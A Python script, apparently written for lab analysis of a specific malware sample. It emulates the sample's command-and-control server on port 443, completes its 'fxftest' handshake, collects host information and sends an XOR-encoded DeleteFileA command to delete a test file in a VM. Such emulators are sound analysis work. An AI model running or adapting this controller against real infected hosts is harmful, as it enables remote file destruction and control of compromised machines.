#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket, struct, binascii, datetime

HOST = ''          # 0.0.0.0
PORT = 443
RECV_SZ = 65535
TIMEOUT_S = 60

# >>> ajusta esto al fichero que quieras borrar en la VM
PATH_TO_DELETE = r"C:\Users\usuario\Desktop\prueba.txt"

def hexdump(b: bytes) -> str:
    hx = binascii.hexlify(b).decode()
    return ' '.join(hx[i:i+2] for i in range(0, len(hx), 2))

def safe_ascii(b: bytes) -> bytes:
    return bytes(ch if 32 <= ch < 127 else 0x2E for ch in b)

def make_handshake_reply() -> bytes:
    return b"fxftest\x00"  # eco de 8 bytes (compara los 7 primeros)

def make_opcode4_packet(path_clear: str) -> bytes:
    # Parametro: 256 bytes NUL-terminado, XOR 0x55
    p = path_clear.encode('ascii', errors='ignore') + b"\x00"
    if len(p) > 256:
        p = p[:256]
        if p[-1] != 0:
            p = p[:-1] + b"\x00"
    else:
        p = p + b"\x00" * (256 - len(p))
    p_xor = bytes([b ^ 0x55 for b in p])
    pkt = struct.pack("<I", 4) + p_xor             # 4 + 256 = 0x104 exacto
    assert len(pkt) == 0x104
    return pkt

def run_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Escuchando en 0.0.0.0:{PORT}")

    while True:
        c, addr = s.accept()
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n[+] {ts} Conexión de {addr[0]}:{addr[1]}")
        c.settimeout(TIMEOUT_S)
        try:
            # 1) HELLO
            data = c.recv(RECV_SZ)
            print(f"[RX {len(data)} B] ASCII={safe_ascii(data)!r}\nHEX = {hexdump(data)}")
            if b"fxftest" not in data:
                print("[!] No llegó el hello esperado.")
                c.close()
                continue
            c.sendall(make_handshake_reply())
            print("[TX handshake 8 B]")

            # 2) SYSINFO (512B)
            data = c.recv(RECV_SZ)
            print(f"[RX {len(data)} B] ASCII={safe_ascii(data)!r}\nHEX = {hexdump(data)}")

            # 3) Enviar opcode 4 con el path a borrar
            pkt4 = make_opcode4_packet(PATH_TO_DELETE)
            c.sendall(pkt4)
            print(f"[TX opcode4=DeleteFileA 0x104 B] path={PATH_TO_DELETE!r}")

            # 4) Leer estado (2 bytes)
            status = c.recv(2)
            print(f"[RX status 2B] {status!r}  HEX={hexdump(status)}")

            if len(status) >= 1:
                if status[0:1] == b'0':
                    print("[OK] DeleteFileA => ÉXITO (malware devolvió '0')")
                elif status[0:1] == b'1':
                    print("[FAIL] DeleteFileA => FALLO (malware devolvió '1')")
                else:
                    print("[?] Código desconocido (no es '0' ni '1')")

        except socket.timeout:
            print("[!] Timeout de socket.")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            try:
                c.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            c.close()
            print("[*] Conexión cerrada.")

if __name__ == "__main__":
    run_server()
